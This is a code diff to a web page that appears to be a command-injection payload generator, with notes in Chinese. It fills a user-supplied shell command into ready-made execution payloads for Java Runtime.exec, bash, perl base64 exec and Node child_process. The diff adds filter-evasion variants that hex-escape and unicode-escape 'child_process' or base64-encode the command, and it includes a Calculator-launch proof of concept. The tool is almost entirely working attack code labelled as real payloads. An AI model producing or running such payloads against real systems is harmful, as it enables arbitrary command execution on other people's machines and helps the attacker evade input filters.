@@ -11,7 +11,7 @@
     <!-- payloads template -->
 
     <textarea id="data0"
-        hidden="true">arr0w1_cmd</textarea>
+        hidden="true">arr0w1_cmd_origin</textarea>
 
     <textarea id="data1" hidden="true">
 1⃣️ 参数类型 String[]
@@ -22,7 +22,7 @@ Executes the specified command and arguments in a separate process.
 java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","echo '123' > ~/Downloads/111.txt"});
 
 🔥实际payload - for Linux/macOS 【成功率很高】
-java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","arr0w1_cmd"});
+java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","arr0w1_cmd_origin"});
 </textarea>
 
     <textarea id="data2" hidden="true">
@@ -35,8 +35,8 @@ java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","arr0w1_cmd"});
 
 
 🔥实际payload    注意: 如果传入的字符串 里有 & _ < > | 符号时, 可能不会执行成功!
-/bin/bash -c $@|bash 0 arr0w1_cmd
-/bin/bash -c $*|bash 0 arr0w1_cmd
+/bin/bash -c $@|bash 0 arr0w1_cmd_origin
+/bin/bash -c $*|bash 0 arr0w1_cmd_origin
 </textarea>
 
     <textarea id="data3" hidden="true">
@@ -52,9 +52,23 @@ perl -MMIME::Base64 -e 'exec decode_base64("arr0w1_base64")'</textarea>
     <textarea id="data4" hidden="true">
 如
 require('child_process').exec('echo \'asd\' > ~/Downloads/11111.txt');//
+require('\x63hild_process').exec('/System/Applications/Calculator.app/Contents/MacOS/Cal\u0063ulator')
+
+ascii to Hex
+c        \x63
+
+UTF-16 to Hex
+c        \u0063
 
 🔥实际payload
-require('child_process').exec('arr0w1_cmd');//
+require('child_process').exec('arr0w1_cmd_origin');//
+
+🔥实际payload (unicode)
+require('\x63hild_process').exec('arr0w1_cmd_ascii2hex');//
+
+🔥实际payload (base64)
+require('\x63hild_process').exec(Buffer.from('arr0w1_base64', 'base64').toString('utf-8'));//
+
 </textarea>
 
     <textarea id="data5" hidden="true">
@@ -169,6 +183,24 @@ require('child_process').exec('arr0w1_cmd');//
 
     // -----
 
+
+function ascii_2_Hex(str) {
+            var re = /[\u4E00-\u9FA5]/;
+            var ar = [];
+            for (var i = 0; i < str.length; i++) {
+                var a = '';
+                if (re.test(str.charAt(i))) { // 中文
+                    a = encodeURI(str.charAt(i)).replace(/%/g, '');
+                } else {
+                    a = "\\x" + str.charCodeAt(i).toString(16);
+                }
+                ar.push(a);
+            }
+            str = ar.join("");
+            return str;
+        }
+
+
     // 生成不带=的base64字符串
     function func_wise_btoa(str1) {
         //原理:在原始js语句后加空格 直到生成的base64字符串没有空格
@@ -184,22 +216,24 @@ require('child_process').exec('arr0w1_cmd');//
 
     var func_oninput = function () {
 
-        var your_cmd = document.getElementById("your_cmd").value;
-
-        var cmd_origin = document.getElementById("data0").value.replace("arr0w1_cmd", your_cmd);
+        var cmd_origin = document.getElementById("data0").value.replace("arr0w1_cmd_origin", document.getElementById("your_cmd").value );
 
         var cmd_origin_btoa_ed = func_wise_btoa(cmd_origin);
 
+        // -------
+        // 设置/替换 textarea的内容
         document.getElementById("payload0").value = cmd_origin;
 
-        document.getElementById("payload1").value = data1.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd/g, your_cmd);
-
         // 全部匹配 /g
-        document.getElementById("payload2").value = data2.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd/g, your_cmd);
+        document.getElementById("payload1").value = data1.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
 
-        document.getElementById("payload3").value = data3.replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd/g, your_cmd);
+        document.getElementById("payload2").value = data2.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
 
-        document.getElementById("payload4").value = data4.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd/g, your_cmd.replace(/\'/g,"\\'") );
+        document.getElementById("payload3").value = data3.replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+
+
+        document.getElementById("payload4").value = data4.replace(/arr0w1_cmd_ascii2hex/g,ascii_2_Hex(cmd_origin)).replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd_origin/g, cmd_origin.replace(/\'/g,"\\'") );
+
 
         document.getElementById("payload5").value = data5.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
 
